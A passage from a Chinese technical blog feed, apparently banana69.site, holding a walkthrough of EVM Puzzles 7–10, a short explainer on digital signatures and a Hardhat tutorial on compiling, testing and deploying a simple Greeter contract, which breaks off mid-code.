class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>CREATE</strong> 指令，该指令会创建一个账户（合约或EOA）。执行 CRATE 指令时需要三个参数，[value offset size]，value 是发送创建合约的 wei 的值，offset 是部署时运行的字节码的内存位置，size 表示字节码的大小。当使用 CREATE 部署新合约时，偏移量的字节码不是新合约的字节码，而是在部署期间被执行的偏移量的字节码，并且返回值是新创建合约的字节码。</p><blockquote><p>这里理解起来有一些抽象，举个例子，如果使用 CREATE 指令来创建一个合约，且部署这个合约的字节码为<code>0x6160016000526002601Ef3</code>，那么由此字节码序列的返回值为 <strong>6001</strong>，因此新创建的合约的字节码为 <strong>6001</strong>，即<code>PUSH1 01</code>，所以当调用这个合约的执行就会执行<code>PUSH1 01</code>。</p></blockquote><p>当 <strong>CREATE</strong> 指令执行后，栈顶的三个值被使用，并且被部署的合约的地址会被压入栈顶，在执行完成后，栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p> 然后就会遇到 <strong>EXTCODESIZE</strong> 指令，该指令需要一个参数，即 **EXTCODESIZE(p)**，返回 p 处的代码的大小。执行完成后继续执行 <code>PUSH1 01</code>，此时栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">01</span> address_code_size <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>紧接着执行 EQ 指令，会检查栈中前俩个值是否相等，并将判断结果压入栈中，然后继续执行<code>PUSH1 13</code>和<code>JUMPI</code>，压入栈中的 13 即表示 条件跳转的位置，而 EQ 判断的结果表示是否跳转，即意味着我们要提供一个使<code>address_code_size == 01 </code>的 calldata 。</p><p>所以我们只需要传入一个 calldata 使得执行，EXTCIDESIZE 时返回的结果为 1即可。执行 CREATE 操作码时，只有 RETURN 操作码返回的代码才是未来调用部署合约时执行的“运行时代码”。字节码的另一部分只使用一次，仅用于构造函数部分。字节码的另一部分只使用一次，仅用于该<code>constructor</code>部分。因此，我们<code>calldata</code>可以在其中包含我们想要的所有代码，但我们需要确保返回的代码（运行时代码）只有 1 条指令。我们希望我们部署的智能合约只有<code>STOP</code>指令（操作码<code>00</code>）。必须发送到<code>CREATE</code>操作码的代码是这样的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUSH1 00 // 00 代表STOP</span><br><span class="line">PUSH1 00 // 这将用作 MSTORE8 的偏移量，在内存中存储 1 个字节</span><br><span class="line">MSTORE8 // 将从偏移量 0 开始在内存中存储 `00` 值（来自第一个 PUSH1）</span><br><span class="line"></span><br><span class="line">PUSH1 01 // 返回多少字节</span><br><span class="line">PUSH1 00 // 从哪个内存偏移量返回这些字节</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><p>上面的操作码转为字节码就是<code>0x600060005360016000F3</code>，所以我们只需要将其作为 calldata 传入即可完成该题目，它将使用该 calldata 来创建和部署一个新合约，该合约的运行时代码为<code>00（STOP）</code></p><h3 id="Puzzle-8"><a href="#Puzzle-8" class="headerlink" title="Puzzle 8"></a>Puzzle 8</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 8 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      6000      PUSH1 00</span><br><span class="line">0D      80        DUP1</span><br><span class="line">0E      80        DUP1</span><br><span class="line">0F      80        DUP1</span><br><span class="line">10      80        DUP1</span><br><span class="line">11      94        SWAP5</span><br><span class="line">12      5A        GAS</span><br><span class="line">13      F1        CALL</span><br><span class="line">14      6000      PUSH1 00</span><br><span class="line">16      14        EQ</span><br><span class="line">17      601B      PUSH1 1B</span><br><span class="line">19      57        JUMPI</span><br><span class="line">1A      FD        REVERT</span><br><span class="line">1B      5B        JUMPDEST</span><br><span class="line">1C      00        STOP</span><br></pre></td></tr></table></figure><p>这道题目又会遇到几个新的指令：</p><ul><li><p><strong>SWAP5：</strong>将位置 0 中的操作码与位置 5 的操作码交换， SWAP 操作包括 SWAP1～SWAP6。</p></li><li><p><strong>GAS：</strong>将交易中剩余的 gas 压入堆栈，会消耗 2 gas。</p></li><li><p><strong>CALL：</strong>创建一个新的子上下文（与外部交互的每个操作都会创建一个新的上下文），并执行外部账户中存在的代码没，如果调用失败，则将 0 压入栈中，否则将 1 压入栈中。如果调用的账户中没有代码，则返回 true。 <strong>CALL</strong> 操作需要 7 个参数，</p><p>— <code>gas</code>：要发送到为执行创建的子上下文的 gas 量<br>— <code>address</code>：将执行上下文的地址<br>— <code>value</code>：以“wei”为单位的值以发送到地址<br>— <code>argsOffset</code>：内存中的字节偏移量（以字节数为单位）<br>— <code>argsSize</code>：从内存中复制的字节大小，具有先前指定的偏移量<br>— <code>retOffset</code>：内存中的字节偏移量，以字节为单位存储执行返回的返回数据<br>— <code>retSize</code>：要从返回的数据中复制的字节大小</p></li></ul><p>然后再来分析代码过程，首先会执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CALLDATASIZE</span><br><span class="line">PUSH1 00</span><br><span class="line">DUP1</span><br><span class="line">CALLDATACOPY</span><br><span class="line">CALLDATASIZE</span><br><span class="line">PUSH1 00</span><br><span class="line">PUSH1 00</span><br><span class="line">CREARTE</span><br></pre></td></tr></table></figure><p>我们传入的 CALLDATA 会创建一个新的合约地址并返回部署地址，当以上操作执行完成后，栈中的结构为</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>接下来执行 5 条与 <strong>CALL</strong> 有关的指令，然后执行 <strong>CALL</strong> 指令，该指令创建一个新的子上下文并执行给定帐户的代码，然后回到当前的账户。即 <strong>CALL</strong> 指令用于与另一个合约进行交互</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUSH1 00</span><br><span class="line">DUP1</span><br><span class="line">DUP1</span><br><span class="line">DUP1</span><br><span class="line">DUP1</span><br></pre></td></tr></table></figure><p>当以上执行被执行完后，栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 <strong>SWAP5</strong> ，该指令会将栈中的第 0 个和第 5 个值进行交换，执行完成后，栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 <strong>CALL</strong> 指令，如果子上下文恢复，则返回 0，否则返回 1。在 <strong>CALL</strong> 指令执行完后，会继续执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUSH1 00</span><br><span class="line">EQ</span><br></pre></td></tr></table></figure><p>意味着需要如果要继续向下执行，就需要 <strong>EQ</strong> 返回 0，即意味着 <strong>CALL</strong> 也需要返回 0。所以就需要输入导致 <strong>CALL</strong> 执行失败的 <strong>CALLDATA</strong>。要让 <strong>CALL</strong> 执行失败有三种方法：</p><ol><li>没有足够的gas</li><li>栈中的参数不够</li><li>如果当前执行的上下文来自 <strong>STATICCALL</strong>，并且wei 的值不是 0。</li></ol><p>需要注意的是，如果 <strong>CALL</strong> 调用的地址中没有代码，那么 <strong>CALL</strong> 会始终返回 true。</p><p>在部署时运行的字节码的返回值会成为新创建的合约的合约的字节码，所以我们可以利用字节码传入 <strong>CALLDATA</strong>，使该字节码在运行时返回 <strong>REVERT</strong> 即可。，所以我们需要传递的数据是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//将 REVERT 的操作码作为合约代码存储在内存中</span><br><span class="line">PUSH1 FD</span><br><span class="line">PUSH1 00</span><br><span class="line">MSTORE 8</span><br><span class="line"></span><br><span class="line">//使构造函数返回存储的运行时代码</span><br><span class="line">PUSH1 01</span><br><span class="line">PUSH1 00</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><p>即 <strong>CALLDATA</strong> 是 <code>0x60FD60005360016000F3</code> 。</p><h3 id="Puzzle-9"><a href="#Puzzle-9" class="headerlink" title="Puzzle 9"></a>Puzzle 9</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 9 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6003      PUSH1 03</span><br><span class="line">03      10        LT</span><br><span class="line">04      6009      PUSH1 09</span><br><span class="line">06      57        JUMPI</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      5B        JUMPDEST</span><br><span class="line">0A      34        CALLVALUE</span><br><span class="line">0B      36        CALLDATASIZE</span><br><span class="line">0C      02        MUL</span><br><span class="line">0D      6008      PUSH1 08</span><br><span class="line">0F      14        EQ</span><br><span class="line">10      6014      PUSH1 14</span><br><span class="line">12      57        JUMPI</span><br><span class="line">13      FD        REVERT</span><br><span class="line">14      5B        JUMPDEST</span><br><span class="line">15      00        STOP</span><br></pre></td></tr></table></figure><p>首先了解俩个新的指令：</p><ul><li><strong>LT：</strong> 从栈中弹出两个值并判断<code>value0 &lt; value1</code>，将其结果压入栈中，若为真则压入 1，否则压入 0</li><li><strong>CALLVALUE:</strong> 将当前调用的 wei 的值压入栈中</li></ul><p>首先看第一处的 <strong>JUMPI</strong>，在执行完 <strong>JUMPI</strong> 指令之前栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">09</span> LT_result  <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>所以需要执行 <strong>JUMPI</strong> 的条件就是 <strong>LT_result</strong> 不为 0，即输入的 value 需要 大于 3。</p><p>然后继续执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CALLVALUE</span><br><span class="line">CALLDATASIZE</span><br><span class="line">MUL</span><br><span class="line">PUSH1 08</span><br><span class="line">EQ</span><br><span class="line">PUSH1 14</span><br><span class="line">JUMPI</span><br></pre></td></tr></table></figure><p> 在执行 <strong>JUMPI</strong> 之前，栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">14</span> EQ_result  <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>所以如果要顺利执行 <strong>JUMPI</strong> 的话，就需要<code>CALLVALUE * CALLDATASIZE == 8</code>，而又需要 <code>CALLDATAVALUE &gt; 3</code>，因此我们传入的 <strong>CALLVALUE</strong> 和 <strong>CALLDATASIZE</strong> 分别是 2 和 4（0x11223344）</p><h3 id="Puzzle-10"><a href="#Puzzle-10" class="headerlink" title="Puzzle 10"></a>Puzzle 10</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#############</span></span><br><span class="line"><span class="comment"># Puzzle 10 #</span></span><br><span class="line"><span class="comment">#############</span></span><br><span class="line"></span><br><span class="line">00      38          CODESIZE</span><br><span class="line">01      34          CALLVALUE</span><br><span class="line">02      90          SWAP1</span><br><span class="line">03      11          GT</span><br><span class="line">04      6008        PUSH1 08</span><br><span class="line">06      57          JUMPI</span><br><span class="line">07      FD          REVERT</span><br><span class="line">08      5B          JUMPDEST</span><br><span class="line">09      36          CALLDATASIZE</span><br><span class="line">0A      610003      PUSH2 0003</span><br><span class="line">0D      90          SWAP1</span><br><span class="line">0E      06          MOD</span><br><span class="line">0F      15          ISZERO</span><br><span class="line">10      34          CALLVALUE</span><br><span class="line">11      600A        PUSH1 0A</span><br><span class="line">13      01          ADD</span><br><span class="line">14      57          JUMPI</span><br><span class="line">15      FD          REVERT</span><br><span class="line">16      FD          REVERT</span><br><span class="line">17      FD          REVERT</span><br><span class="line">18      FD          REVERT</span><br><span class="line">19      5B          JUMPDEST</span><br><span class="line">1A      00          STOP</span><br></pre></td></tr></table></figure><p>还是先学习一下新的操作码：</p><ul><li><strong>GT</strong>：从堆栈中弹出 2 个值并判断<code>value0 &lt; value1</code>，如果结果为 true 则压入 1，否则压入 0</li><li><strong>MOD：</strong>从堆栈中弹出 2 个值并将结果其运算<code>value0 % value1</code>。若分母 ( <code>value1</code>) 是<code>0</code>则结果为 0</li><li><strong>ISZERO：</strong>从堆栈中弹出一个值并判断`value0 === 0，将判断结果压入栈</li></ul><p>在执行完 <strong>SWAP1</strong> 后栈中的结构如下</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[1b callvalue <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>GT</strong> 指令，如果要顺利执行 <strong>JUMPI</strong>，就是需要 <strong>GT</strong> 指令返回的值为 1，因此我们输入的 <strong>CALLVALUE</strong> 必须要小于 1b(27)，然后就会跳到第 8 条指令。</p><p>接着执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CALLDATASIZE </span><br><span class="line">PUSH2 0003</span><br><span class="line">SWAP1</span><br></pre></td></tr></table></figure><p>以上指令将 CALLDATA 的大小和 0003 压入栈中，并交换他们的位置，此时栈中的结构为</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[calldata_size <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>MOD</strong> 指令，该指令会进行取模运算，将得到结果压入栈中，紧接着执行 <strong>ISZERO</strong> 指令，判断栈顶元素的值是否为 0。然后继续往下执行，当执行到 <strong>JUMPI</strong>  时，栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[0A+CALLVALUE ISZERO_result  <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>由于需要继续往下执行 <strong>JUMPI</strong> ，所在在这里的 <strong>ISERO_result</strong> 的值必须为 1，即意味着上边 <strong>MOD</strong> 运算的结果为 0，且<code>0A+CALLVALUE ISZERO_result == 0x19(25)</code>，所以 <strong>CALLVALUE</strong> 的值为 15，<strong>CALLDATASIZE</strong> 的值为 0 即可。</p><p><img src="/image/evm-puzzles.assets/2.png" alt="2"></p><p>到这里就完成了所有的题目，在完成这些题目的过程中既掌握了不少 EVM opcode 的用法，也了解了 EVM 的基本运行机制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Evm-puzzles 是一个以太坊操作码的挑战，每道题都会提供一些列操作码，并提示输入正确的交易值或者调用数据。通过Evm-puzzles可以了解EVM操作码的运行机制&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/image/evm-puzzles.assets/1.png&quot; a</summary>
      
    
    
    
    <category term="Solidity" scheme="https://banana69.site/categories/Solidity/"/>
    
    
    <category term="Solidity" scheme="https://banana69.site/tags/Solidity/"/>
    
  </entry>
  
  <entry>
    <title>数字签名原理和过程</title>
    <link href="https://banana69.site/2022/06/17/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    <id>https://banana69.site/2022/06/17/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/</id>
    <published>2022-06-17T07:21:46.000Z</published>
    <updated>2022-07-28T06:31:50.010Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p><strong>数字签名的计算方法：</strong><br>  算出内容的 hash 值，然后用私钥加密，这就是数字签名；<br>  用户收到信息后，用公钥解密数字签名得到 hash 值，与原内容的hash值进行比较。</p></li><li><p><strong>作用：</strong></p><ol><li> 不可抵赖：如果公钥能解密，则内容一定是与该公钥对应的私钥加密而来，即可证明来源。</li><li>数据完整性：数字签名的HASH值和自己计算出的HASH值一致，即可证明该内容是完整的未经修改过。<br>但是数字签名不能确保”公钥”的真实性，第三方可偷换”公钥”，达到与伪服务器通信的目的。</li></ol></li><li><p><strong>数字证书</strong><br>  由权威证书中心颁发用来证明公钥的真实性。</p></li><li><p><strong>数字签名的过程：</strong><br>  现有通信双方 A,B，俩者之间使用俩套非对称加密机制，现在A向B发送消息<br>  <img src="/image/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D.assets/image-20220415231317783.png" alt="image-20220415231317783"><br>  存在问题：如果在发送过程中有人修改了秘文的消息，B拿到的秘文就并非是A所发送的，所以需要数字签名解决俩个问题：</p><pre><code>  1⃣️A的身份认证  2⃣️A发送的消息完整性</code></pre><p>  <img src="/image/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D.assets/image-20220415231328262.png" alt="image-20220415231328262"><br>  A：将明文进行摘要运算后得到摘要（消息完整性），再将摘要用A的私钥加密（身份认证），得到数字签名，将密文和数字签名一块发给B。<br>  B：收到A的消息后，先将密文用自己的私钥解密，得到明文。将数字签名用A的公钥进行解密后，得到正确的摘要（解密成功说明A的身份被认证了)。</p><p>  对明文进行摘要运算，得到实际收到的摘要，将两份摘要进行对比，如果一致，说明消息没有被篡改（消息完整性）。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;数字签名的计算方法：&lt;/strong&gt;&lt;br&gt;  算出内容的 hash 值，然后用私钥加密，这就是数字签名；&lt;br&gt;  用户收到信息后，用公钥解密数字签名得到 hash 值，与原内容的hash值进行比较。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="密码学" scheme="https://banana69.site/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="数字签名" scheme="https://banana69.site/tags/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>Hardhat 基本操作</title>
    <link href="https://banana69.site/2022/04/17/hardhat%20%E4%BD%BF%E7%94%A8/"/>
    <id>https://banana69.site/2022/04/17/hardhat%20%E4%BD%BF%E7%94%A8/</id>
    <published>2022-04-17T07:21:46.000Z</published>
    <updated>2022-07-28T06:49:37.907Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Hardhat 是一个用于编译、部署、测试和调试以太坊软件的开发环境。它可以帮助开发人员管理和自动化构建智能合约和 dApp 过程中固有的重复性任务，并围绕此工作流程轻松引入更多功能。这意味着在核心上编译、运行和测试智能合约。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ol><li><p>初始化 hardhat 项目：<code>npx hardhat</code></p></li><li><p>项目结构为：</p><ul><li><p><code>contracts/</code>是合约所在的位置。</p></li><li><p><code>test/</code>是测试文件的位置。</p></li><li><p><code>scripts/</code>是部署脚本的位置。</p></li></ul></li><li><p>编译合约：<code>npx hardhat compile</code></p><p>当一个项目中有不同版本的合约文件时可以在 <code>hardhat.config.js</code>中配置编译器的版本，有以下俩种方式：</p><ul><li><p>配置不同的版本号</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: &#123;</span><br><span class="line">    <span class="attr">compilers</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">version</span>: <span class="string">&quot;0.5.5&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">version</span>: <span class="string">&quot;0.6.7&quot;</span>,</span><br><span class="line">        <span class="attr">settings</span>: &#123;&#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样配置可以使合约中不同的文件应用于不同的编译器</p></li><li><p>根据文件进行配置</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: &#123;</span><br><span class="line">    <span class="attr">compilers</span>: [...],</span><br><span class="line">    <span class="attr">overrides</span>: &#123;</span><br><span class="line">      <span class="string">&quot;contracts/Foo.sol&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">version</span>: <span class="string">&quot;0.5.5&quot;</span>,</span><br><span class="line">        <span class="attr">settings</span>: &#123; &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将合约编译器的版本号指定到不同的文件</p></li></ul></li><li><p>测试合约：<code>npx hardhat test</code></p><p>例：针对以下这份合约编写简单的测试文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//Greeter.sol</span><br><span class="line">//SPDX-License-Identifier: Unlicense</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Greeter &#123;</span><br><span class="line">    string private greeting;</span><br><span class="line"></span><br><span class="line">    constructor(string memory _greeting) &#123;</span><br><span class="line">        console.log(&quot;Deploying a Greeter with greeting:&quot;, _greeting);</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function greet() public view returns (string memory) &#123;</span><br><span class="line">        return greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setGreeting(string memory _greeting) public &#123;</span><br><span class="line">        console.log(&quot;Changing greeting from &#x27;%s&#x27; to &#x27;%s&#x27;&quot;, greeting, _greeting);</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写测试文件使用 Waffle 库，它是一个编写和测试智能合约的库，使用<code>ether.js</code>。我们在这里使用<code>chai</code>，它是一个断言库。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">&quot;chai&quot;</span>);</span><br></pre></td></tr></table></figure><p>在封装器中的 <code>it</code> 的回调函数中使用了<code>async</code>，与以太坊网络和智能合约的交互是异步操作，因此大多数 API 和库使用 JavaScript 的 <code>promise</code> 来返回值。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">describe(<span class="string">&quot;Greeter&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  it(<span class="string">&quot;Should return the new greeting once it&#x27;s changed&quot;</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在 <code>ether.js</code>中， ContractFactory 是一个用于部署新合约的抽象，所以这里的 Greeter 是 Greeter 合约的工厂函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Greeter = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">&quot;Greeter&quot;</span>);</span><br></pre></td></tr></table></figure><p>在 ContractFactory 上调用 <code>deploy()</code>就会部署合约，并返回一个解析为 contract 的Promise，这是为智能合约的每个功能提供方法的对象，这里将 <code>Hello World!</code>作为参数传递给合约的构造函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> greeter = <span class="keyword">await</span> Greeter.deploy(<span class="string">&quot;Hello, world!&quot;</span>);</span><br></pre></td></tr></table></figure><p>使用 <code>chai</code>库的匹配器<code>expect</code>，检查调用<code>greet()</code>方法时是否匹配<code>Hello, World!</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">expect(<span class="keyword">await</span> greeter.greet()).to.equal(<span class="string">&quot;Hello, world!&quot;</span>);</span><br></pre></td></tr></table></figure><p>以同样的方式调用合约方法，修改合约状态，调用<code>setGreeting</code>设置新的参数，在 promise 被解析后，我们执行另一个断言来判断状态是否改变</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> greeter.setGreeting(<span class="string">&quot;Hola, mundo!&quot;</span>);</span><br><span class="line">expect(<span class="keyword">await</span> greeter.greet()).to.equal(<span class="string">&quot;Hola, mundo!&quot;</span>);</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="/image/hardhat_init.assets/image-20220417130632372.png" alt="image-20220417130632372"></p></li><li><p>部署合约： <code>npx hardhat run scripts/deploy.js</code></p><p>使用 js 脚本来部署合约项目，如下代码为从实例项目部署合约</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// We get the contract to deploy</span></span><br><span class="line">  <span class="keyword">const</span> Greeter = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">&quot;Greeter&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> greeter = <span class="keyword">await</span> Greeter.deploy(<span class="string">&quot;Hello, Hardhat!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> greeter.deployed();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;Greeter deployed to:&quot;</span>, greeter.address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">  .then(<span class="function">() =&gt;</span> process.exit(<span class="number">0</span>))</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">    process.exit(<span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></li><li><p>启动本地节点：<code>npx hardhat node</code></p></li><li><p>在 localhost 中部署智能合约：<code>npx hardhat run --network localhost scripts/deploy.js</code></p></li></ol><h3 id="使用-hardhat-构建一个简单的-web3-mint-页面"><a href="#使用-hardhat-构建一个简单的-web3-mint-页面" class="headerlink" title="使用 hardhat 构建一个简单的 web3 mint 页面"></a>使用 hardhat 构建一个简单的 web3 mint 页面</h3><h5 id="0x01-初始化项目"><a href="#0x01-初始化项目" class="headerlink" title="0x01 初始化项目"></a>0x01 初始化项目</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx create-react-app hardhat-react-1</span><br><span class="line">npx hardhat</span><br><span class="line">npm install @openzeppelin/contracts</span><br></pre></td></tr></table></figure><p>最终的项目结构：</p><p><img src="/image/hardhat_init.assets/image-20220417153740357.png" alt="image-20220417153740357"></p><h5 id="0x02-编译合约"><a href="#0x02-编译合约" class="headerlink" title="0x02 编译合约"></a>0x02 编译合约</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: Unlicense</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line">import &#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;;</span><br><span class="line">import &#x27;@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol&#x27;;</span><br><span class="line">import 